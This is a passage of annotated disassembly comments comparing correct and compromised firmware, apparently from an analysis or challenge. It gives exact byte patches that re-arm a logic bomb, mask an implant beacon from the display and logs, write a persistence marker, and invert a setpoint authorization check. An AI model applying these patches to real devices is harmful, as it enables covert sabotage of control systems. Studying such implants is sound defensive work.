;     VA 0x1000A46E  file 0xA46E
;       d0fa  beq.n 0x1000A466   ; correct: re-install gate clear, no re-arm
;     COMPROMISE: patch byte 0xA46F 0xD0 -> 0xD1 (beq -> bne)
;     A present reserved-sector marker re-arms the logic bomb on every boot,

;
;   Defect 2 - Rootkit hiding (implant_rootkit_active)
;     VA 0x1000A2D0  file 0xA2D0
;       b123  cbz r3, 0x1000A2DC ; correct: rootkit gate clear, no masking
;     COMPROMISE: patch byte 0xA2D1 0xB1 -> 0xB9 (cbz -> cbnz)
;     The beacon status is masked from B:UP to B:-- on the LCD and the BCN
;     maintenance log is suppressed while the beacon still transmits.
;
;   Defect 3 - Reserved-sector write (implant_init, implant_persist inlined)
;     VA 0x1000A42C  file 0xA42C
;       b1db  cbz r3, 0x1000A466 ; correct: persist gate clear, no write
;     COMPROMISE: patch byte 0xA42D 0xB1 -> 0xB9 (cbz -> cbnz)
;     The persist gate is inverted, so the first boot writes marker 0xC7 to
;     0x103FF000. The detonation-path copy in implant_tick stays gated.
;
;   Defect 4 - SETPOINT authorization (control_handle_frame)
;     VA 0x10007580  file 0x7580
;       d0e1  beq.n 0x10007546   ; correct: authorization failed, reject
;     COMPROMISE: patch byte 0x7581 0xD0 -> 0xD1 (beq -> bne)
;     The authorization verdict is inverted, so an unauthenticated or replayed
;     SETPOINT envelope reaches the applied setpoint.
;
; The CoreDebug DHCSR anti-debug check is identical in both images and is an
